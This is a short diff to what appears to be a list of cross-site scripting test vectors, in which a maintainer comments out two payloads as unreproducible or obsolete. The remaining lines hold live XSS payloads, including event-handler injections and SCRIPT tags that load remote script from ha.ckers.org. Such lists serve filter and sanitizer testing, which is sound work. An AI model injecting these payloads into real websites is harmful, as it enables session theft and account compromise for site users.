@@ -32,7 +32,8 @@
 <IMG SRC=# onmouseover="alert('xxs')">
 
 # Default SRC tag by leaving it empty
-<IMG SRC= onmouseover="alert('xxs')">
+# nickg; Unable to replicate in FF,Safari,Chrome 2014-01-10
+# <IMG SRC= onmouseover="alert('xxs')">
 
 # Default SRC tag by leaving it out entirely
 <IMG onmouseover="alert('xxs')">
@@ -84,7 +85,10 @@
 
 # Non-alpha-non-digit XS
 <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+# this is bogus or obsolete
+# <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
 <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
 # Extraneous open brackets
